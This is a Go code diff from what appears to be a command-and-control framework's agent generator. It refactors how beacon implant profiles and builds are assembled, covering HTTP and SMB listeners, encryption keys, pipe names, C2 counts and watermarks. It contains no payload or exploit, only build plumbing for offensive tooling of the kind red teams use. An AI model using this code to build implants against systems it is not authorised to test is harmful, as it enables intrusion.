@@ -7,22 +7,12 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"hash/crc32"
 	"math/rand"
 	"os"
 	"os/exec"
 	"strconv"
 	"strings"
 	"time"
-)
-
-var SetListeners = []string{"BeaconHTTP", "BeaconSMB"}
-
-const (
-	SetName            = "beacon"
-	SetUiPath          = "_ui_agent.json"
-	SetCmdPath         = "_cmd_agent.json"
-	SetMaxTaskDataSize = 0x1900000 // 25 Mb
 )
 
 type GenerateConfig struct {
@@ -42,7 +32,7 @@ var (
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
-func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
+func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 	var (
 		generateConfig GenerateConfig
 		err            error
@@ -54,8 +44,10 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		return nil, err
 	}
 
-	table := crc32.MakeTable(crc32.IEEE)
-	agentCrc := int(crc32.Checksum([]byte(SetName), table))
+	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
+	if err != nil {
+		return nil, err
+	}
 
 	encrypt_key, _ := listenerMap["encrypt_key"].(string)
 	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
@@ -99,7 +91,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 			return nil, err
 		}
 
-		params = append(params, agentCrc)
+		params = append(params, int(agentWatermark))
 		params = append(params, Ssl)
 		params = append(params, PortAgent)
 		params = append(params, c2Count)
@@ -123,7 +115,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 
 		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
 
-		params = append(params, agentCrc)
+		params = append(params, int(agentWatermark))
 		params = append(params, pipename)
 		params = append(params, int(lWatermark))
 		params = append(params, seconds)
@@ -157,7 +149,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 	return []byte(profileString), nil
 }
 
-func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
+func AgentGenerateBuild(agentConfig string, operatingSystem string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	var (
 		generateConfig GenerateConfig
 		ConnectorFile  string
@@ -177,7 +169,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", err
 	}
 
-	currentDir := PluginPath
+	currentDir := ModuleDir
 	tempDir, err := os.MkdirTemp("", "ax-*")
 	if err != nil {
 		return nil, "", err
